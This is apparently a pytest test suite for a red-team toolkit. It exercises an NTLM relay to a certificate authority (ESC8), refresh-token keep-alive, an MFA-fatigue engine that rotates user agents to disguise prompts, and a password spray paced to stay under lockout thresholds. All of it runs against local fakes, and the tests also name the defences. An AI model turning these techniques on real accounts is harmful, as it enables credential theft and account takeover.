"""The brutal four: NTLM relay (ESC8), keep-alive, MFA fatigue, lockout-aware spray.

The relay test is a real one: a fake CA that offers NTLM and hands back a certificate on a
Type3, and a client that walks negotiate -> challenge -> authenticate through the relay. What it
proves is that the CA's answer lands in the CLIENT's hands, which is the whole point of a relay.
"""
import base64
import os
import struct
import sys
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import keepalive as K  # noqa: E402
from core import mfafatigue as F  # noqa: E402
from core import relay as R  # noqa: E402
from core import spray as S  # noqa: E402

# integration: a real relay listener on a local socket
pytestmark = pytest.mark.integration


def ntlm_type1():
    return base64.b64encode(b"NTLMSSP\x00" + struct.pack("<I", 1) + b"\x00" * 24).decode()


def ntlm_type2(challenge=b"ABCDEFGH"):
    raw = (b"NTLMSSP\x00" + struct.pack("<I", 2) + struct.pack("<HHI", 0, 0, 0)
           + struct.pack("<I", 0x20882905) + challenge + b"\x00" * 8)
    return base64.b64encode(raw).decode()


def ntlm_type3(user="administrator", domain="CONTOSO", workstation="DC01"):
    """A spec-correct AUTHENTICATE_MESSAGE: domain@28, user@36, workstation@44, flags@60."""
    payload, bufs = b"", []
    for text in (domain, user, workstation, "", "", ""):
        blob = text.encode("utf-16-le")
        bufs.append((len(blob), 64 + len(payload)))
        payload += blob
    msg = b"NTLMSSP\x00" + struct.pack("<I", 3)
    msg += struct.pack("<HHI", 0, 0, 0)                                  # LM @12
    msg += struct.pack("<HHI", 0, 0, 0)                                  # NT @20
    msg += struct.pack("<HHI", bufs[0][0], bufs[0][0], bufs[0][1])       # domain @28
    msg += struct.pack("<HHI", bufs[1][0], bufs[1][0], bufs[1][1])       # user @36
    msg += struct.pack("<HHI", bufs[2][0], bufs[2][0], bufs[2][1])       # workstation @44
    msg += struct.pack("<HHI", 0, 0, 0)                                  # session key @52
    msg += struct.pack("<I", 0x20882905)                                 # flags @60
    assert len(msg) == 64
    return base64.b64encode(msg + payload).decode()


class FakeCA(BaseHTTPRequestHandler):
    """Offers NTLM, hands a certificate to whoever completes the exchange."""

    def log_message(self, fmt, *args):
        return

    def _go(self):
        auth = self.headers.get("Authorization", "")
        if not auth.lower().startswith("ntlm"):
            self.send_response(401)
            self.send_header("WWW-Authenticate", "Negotiate, NTLM")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        if R.ntlm_type(auth) == 1:
            self.send_response(401)
            self.send_header("WWW-Authenticate", "NTLM " + ntlm_type2())
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = b"CERTIFICATE-FOR-ADMINISTRATOR"
        self.send_response(200)
        self.send_header("Content-Type", "application/pkcs7-mime")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._go()

    def do_POST(self):
        self._go()


class TestTheRelay:

    def test_the_message_type_is_read_from_a_header_value(self):
        assert R.ntlm_type("NTLM " + ntlm_type1()) == 1
        assert R.ntlm_type("NTLM " + ntlm_type2()) == 2
        assert R.ntlm_type("NTLM " + ntlm_type3()) == 3
        assert R.ntlm_type("Basic dXNlcjpwYXNz") == 0
        assert R.ntlm_type("") == 0, "0 means \"not an NTLM message\""
        assert R.ntlm_type(None) == 0
        assert R.parse_ntlm(None) is None, "the parser reports nothing for nothing"

    def test_the_type3_fields_are_read_at_the_spec_offsets(self):
        msg = R.parse_ntlm("NTLM " + ntlm_type3("svc_backup", "CONTOSO", "SRV-01"))
        assert msg.user == "svc_backup" and msg.domain == "CONTOSO"
        assert msg.workstation == "SRV-01"

    def test_the_challenge_is_read_from_a_type2(self):
        msg = R.parse_ntlm("NTLM " + ntlm_type2(b"12345678"))
        assert msg.type == 2 and msg.challenge == b"12345678"

    def test_a_real_relay_hands_the_cas_answer_to_the_client(self):
        ca = ThreadingHTTPServer(("127.0.0.1", 0), FakeCA)
        ca.daemon_threads = True
        ca_port = ca.server_address[1]
        threading.Thread(target=ca.serve_forever, daemon=True).start()
        seen = []
        relay = R.Relay(f"http://127.0.0.1:{ca_port}", host="127.0.0.1", port=0,
                        on_auth=seen.append).start()
        relay_port = relay._httpd.server_address[1]
        try:
            def call(auth=None):
                req = urllib.request.Request(
                    f"http://127.0.0.1:{relay_port}/certsrv/certfnsh.asp",
                    headers={"Authorization": "NTLM " + auth} if auth else {})
                try:
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        return resp.status, resp.read(), dict(resp.headers)
                except urllib.error.HTTPError as e:
                    return e.code, e.read(), dict(e.headers or {})

            status, _body, headers = call()
            assert status == 401 and "NTLM" in headers.get("WWW-Authenticate", "")

            status, _body, headers = call(ntlm_type1())
            challenge = headers.get("WWW-Authenticate", "")
            assert "NTLM " in challenge, "the challenge must come from the CA"

            status, body, _headers = call(ntlm_type3())
            assert status == 200 and body == b"CERTIFICATE-FOR-ADMINISTRATOR", \
                "the CA's answer must land in the CLIENT's hands"
            assert relay.relayed == 1
            assert seen and seen[0]["user"] == "administrator" and seen[0]["domain"] == "CONTOSO"
            assert any(row["step"] == "relay" for row in relay.log)
        finally:
            relay.stop()
            ca.shutdown()

    def test_a_target_that_does_not_offer_ntlm_is_reported(self):
        class Plain(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), Plain)
        srv.daemon_threads = True
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        relay = R.Relay(f"http://127.0.0.1:{srv.server_address[1]}", host="127.0.0.1", port=0)
        try:
            with pytest.raises(R.RelayError) as ei:
                relay.handle_authorization("NTLM " + ntlm_type1())
            assert "not offering NTLM" in str(ei.value)
        finally:
            srv.shutdown()

    def test_the_plan_names_esc8_and_what_stops_it(self):
        plan = R.plan("http://ca.test", listen_port=8088)
        assert "channel binding" in plan["why_it_works"]
        joined = " ".join(plan["stops_it"])
        assert "Extended Protection" in joined and "WebClient" in joined
        assert "ESC8 relay plan" in R.describe(plan)

    def test_the_coercion_plan_offers_a_trigger_that_needs_no_vulnerability(self):
        plan = R.coerce_plan(victim_host="WS-01", listener="10.0.0.5")
        kinds = {t["kind"] for t in plan["triggers"]}
        assert {"document", "rpc", "lure"} <= kinds
        doc = [t for t in plan["triggers"] if t["kind"] == "document"][0]
        assert "WebClient" in doc["needs"]


class TestKeepAlive:

    def test_a_rotation_keeps_the_newest_token(self):
        calls = []

        def post(url, data, timeout):
            calls.append(data)
            n = len(calls)
            return {"access_token": f"AT-{n}", "refresh_token": f"RT-{n}"}

        ka = K.KeepAlive("RT-0", client_id="client-1", post=post)
        ka.tick()
        assert ka.refresh_token == "RT-1"
        ka.tick()
        assert ka.refresh_token == "RT-2", "the previous refresh token is consumed"
        assert calls[1]["refresh_token"] == "RT-1", "the newest token is what gets exchanged"
        assert ka.rotations == 2

    def test_a_revoked_token_ends_the_daemon_with_the_tenants_reason(self):
        # the transport is INJECTED: without it this test signs in against the real
        # login.microsoftonline.com and gets a real AADSTS error back
        def post(url, data, timeout):
            return {"error": "invalid_grant", "error_description": "AADSTS50173: revoked"}

        ka = K.KeepAlive("RT-0", client_id="c", post=post)
        with pytest.raises(K.KeepAliveError) as ei:
            ka.tick()
        assert "AADSTS50173" in str(ei.value)

    def test_the_state_file_resumes_the_newest_token(self, tmp_path):
        path = os.path.join(str(tmp_path), "ka.json")
        ka = K.KeepAlive("RT-0", client_id="c", state_path=path,
                         post=lambda u, d, t: {"access_token": "AT", "refresh_token": "RT-9"})
        ka.tick()
        again = K.KeepAlive("RT-old", client_id="c", state_path=path).load()
        assert again.refresh_token == "RT-9" and again.rotations == 1
        assert not os.path.exists(path + ".tmp"), "the write is atomic"

    def test_a_token_without_a_client_id_is_refused(self):
        with pytest.raises(K.KeepAliveError):
            K.rotate_once("RT", client_id="")

    def test_the_plan_warns_that_a_device_bound_token_cannot_be_kept_alive(self):
        plan = K.plan({"access_token": "x", "refresh_token": "y"})
        assert any("device-bound" in item for item in plan["killed_by"])
        assert "cadence" in plan["visible"]
        assert "keep-alive" in K.describe(plan)


class TestFatigue:

    def test_the_schedule_is_jittered_and_inside_the_window(self):
        times = F.schedule(count=6, window=1800, seed=3)
        assert len(times) == 6 and times == sorted(times)
        assert all(0 <= t <= 1800 for t in times)
        assert len(set(times)) == 6

    def test_a_different_seed_gives_a_different_cadence(self):
        assert F.schedule(count=6, window=1800, seed=1) != F.schedule(count=6, window=1800,
                                                                     seed=2)

    def test_an_approval_stops_the_run(self):
        seen = []
        engine = F.Fatigue("u@x", count=5, window=10, seed=5, sleep=lambda s: None,
                           submit=lambda pw, ua: (seen.append(ua),
                                                  {"approved": len(seen) == 2})[1])
        out = engine.run("Correct!")
        assert out["approved"] is True and out["attempts"] == 2
        assert len(out["rows"]) == 2

    def test_the_user_agent_rotates_so_each_prompt_looks_like_a_different_client(self):
        seen = []
        engine = F.Fatigue("u@x", count=len(F.USER_AGENTS), window=10, sleep=lambda s: None,
                           submit=lambda pw, ua: (seen.append(ua), {"approved": False})[1])
        engine.run("Correct!")
        assert len(set(seen)) == len(F.USER_AGENTS)

    def test_a_submit_error_does_not_kill_the_engine(self):
        def submit(pw, ua):
            raise OSError("connection reset")

        engine = F.Fatigue("u@x", count=2, window=10, sleep=lambda s: None, submit=submit)
        out = engine.run("x")
        assert out["approved"] is False and len(out["rows"]) == 2
        assert "connection reset" in out["rows"][0]["result"]["error"]

    def test_without_a_submit_function_it_refuses(self):
        with pytest.raises(F.FatigueError):
            F.Fatigue("u@x").run("x")

    def test_the_plan_names_number_matching_as_the_thing_that_defeats_it(self):
        plan = F.plan(account="u@x", number_matching=True)
        assert plan["number_matching_defeats_it"] is True
        assert any("number matching" in item for item in plan["killed_by"])
        assert "number matching" in F.describe(plan)


class TestSpray:

    def test_the_budget_is_one_below_the_threshold(self):
        assert S.Pacer(threshold=5).per_account_budget == 4
        assert S.Pacer(threshold=10, per_account_budget=2).per_account_budget == 2

    def test_an_account_stops_being_tryable_at_its_budget(self):
        pacer = S.Pacer(threshold=3, window=3600)
        assert pacer.remaining("alice") == 2
        pacer.note("alice")
        pacer.note("alice")
        ok, why = pacer.can_try("alice")
        assert ok is False and "attempt(s)" in why
        assert pacer.remaining("bob") == 2, "the budget is per account"

    def test_a_lockout_stops_the_run(self):
        calls = []

        def submit(user, password):
            calls.append(user)
            return {"locked": True} if user == "bob" else {"valid": False}

        out = S.spray(["alice", "bob", "carol"], ["Spring2026!"], submit=submit,
                      sleep=lambda s: None)
        assert out["locked"] == ["bob"] and "locked out" in out["stopped"]
        assert "carol" not in calls, "the run stops at the lockout"

    def test_a_valid_credential_ends_the_spray_immediately(self):
        def submit(user, password):
            return {"valid": user == "carol"}

        out = S.spray(["alice", "bob", "carol"], ["Spring2026!"], submit=submit,
                      sleep=lambda s: None)
        assert len(out["valid"]) == 1 and out["valid"][0]["user"] == "carol"

    def test_an_account_out_of_budget_is_skipped_not_attempted(self):
        pacer = S.Pacer(threshold=3, window=3600)     # budget: 2
        pacer.note("alice")                           # one already spent -> 1 left
        calls = []
        out = S.spray(["alice"], ["p1", "p2"], submit=lambda u, p: (calls.append(u),
                                                                   {"valid": False})[1],
                      pacer=pacer, sleep=lambda s: None)
        assert len(calls) == 1, "the second password must not be tried"
        assert out["rows"][-1]["result"] == "skipped"
        assert "attempt(s)" in out["rows"][-1]["why"]

    def test_an_account_whose_budget_is_already_spent_is_never_attempted(self):
        pacer = S.Pacer(threshold=2, window=3600)     # budget: 1
        pacer.note("alice")
        calls = []
        out = S.spray(["alice"], ["p1"], submit=lambda u, p: (calls.append(u),
                                                             {"valid": False})[1],
                      pacer=pacer, sleep=lambda s: None)
        assert calls == [] and out["rows"][0]["result"] == "skipped"

    def test_a_global_rate_caps_the_window(self):
        pacer = S.Pacer(threshold=5, window=3600, global_rate=2)
        pacer.note("a")
        pacer.note("b")
        ok, why = pacer.can_try("c")
        assert ok is False and "global rate" in why

    def test_without_a_submit_function_it_refuses(self):
        with pytest.raises(S.SprayError):
            S.spray(["a"], ["p"])

    def test_the_plan_states_the_rules_and_the_visibility(self):
        plan = S.plan(users=500, passwords=3, threshold=10)
        assert plan["per_account_budget"] == 9
        assert any("threshold" in r for r in plan["rules"])
        assert any("failed sign-ins" in v for v in plan["visible"])
